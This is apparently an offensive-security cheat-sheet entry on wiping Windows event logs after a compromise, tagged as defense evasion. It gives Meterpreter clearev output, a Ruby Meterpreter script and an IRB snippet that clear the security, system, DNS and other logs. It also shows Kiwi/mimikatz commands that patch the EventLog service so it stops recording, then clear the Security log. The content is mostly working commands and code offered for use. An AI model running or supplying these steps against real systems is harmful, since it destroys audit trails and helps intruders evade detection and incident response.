---
author(s):
  - Userware
tags:
  - post-exploitation
  - defense-evasion
  - anti-forensics
  - T1070-001
---
# Metasploit

## 01 - Meterpreter API Commands

```
meterpreter > clearev
[*] Wiping 2538 records from Application...
[*] Wiping 1587 records from System...
[*] Wiping 15491 records from Security...
```

Copy the file in `/usr/share/metasploit-framework/scripts/meterpreter/`.

```ruby
log.clear
def clrevtlgs()
	evtlogs = [
		'security',
		'system',
		'application',
		'directory service',
		'dns server',
		'file replication service'
	]
	print_status("Clearing Event Logs, this will leave and event 517")
	begin
		evtlogs.each do |evl|
			print_status("\tClearing the #{evl} Event Log")
			log = @client.sys.eventlog.open(evl)
			log.clear
			file_local_write(@dest,"Cleared the #{evl} Event Log")
		end
		print_status("All Event Logs have been cleared")
	rescue ::Exception => e
		print_status("Error clearing Event Log: #{e.class} #{e}")

	end
end
```

Then execute the meterpreter script.

```
meterpreter > run clearlogs
```

You can do this in IRB

```
meterpreter > irb
>> evtlogs = [
    'security',
    'system',
    'application',
    'directory service',
    'dns server',
    'file replication service'
    ]
print_line("Clearing Event Logs, this will leave an event 517")
evtlogs.each do |evl|
    print_status("Clearing the #{evl} Event Log")
    log = client.sys.eventlog.open(evl)
    log.clear
end
print_line("All Clear! You are a Ninja!")
```

## 02 - Kiwi

```
meterpreter > kiwi_cmd event::
ERROR mimikatz_doLocal ; "(null)" command of "event" module not found !

Module :        event
Full name :     Event module

            drop  -  [experimental] patch Events service to avoid new events
           clear  -  Clear an event log

meterpreter > kiwi_cmd event::drop
"EventLog" service patched

meterpreter > kiwi_cmd event::clear
Using "Security" event log :
- 1 event(s)
- Cleared !
- 0 event(s)
```